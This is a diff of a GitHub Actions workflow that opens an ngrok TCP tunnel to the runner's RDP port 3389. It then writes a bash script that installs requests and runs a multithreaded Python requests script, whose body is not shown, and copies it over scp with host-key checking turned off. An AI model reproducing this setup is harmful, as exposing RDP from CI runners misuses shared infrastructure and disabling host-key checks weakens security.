@@ -31,21 +31,22 @@ jobs:
 
     - name: Create Tunnel
       run: |
-        .\ngrok\ngrok.exe tcp 3389 &
+        Start-Process -NoNewWindow -FilePath .\ngrok\ngrok.exe -ArgumentList "tcp", "3389"
 
     - name: Wait for Tunnel to be ready
       run: Start-Sleep -s 10
 
     - name: Run Bash Script on Remote Machine
       run: |
-        # Write Bash script to a file
-        echo '#!/bin/bash
+        # PowerShell Here-String to define the Bash script
+        $bashScript = @'
+        #!/bin/bash
 
         # Install requests library
         pip install requests
 
         # Create Python script file
-        echo \'
+        echo '
         import requests
         import threading
 
@@ -65,11 +66,13 @@ jobs:
 
         for thread in threads:
             thread.join()
-        \' > script.py
+        ' > script.py
 
         # Run the script
         python script.py
-        ' > run_script.sh
+'@
+        # Save Bash script to a file
+        $bashScript | Out-File -FilePath run_script.sh -Encoding utf8
 
         # Copy the Bash script to the remote machine
         scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i path/to/your/private/key.pem run_script.sh runneradmin@localhost:~
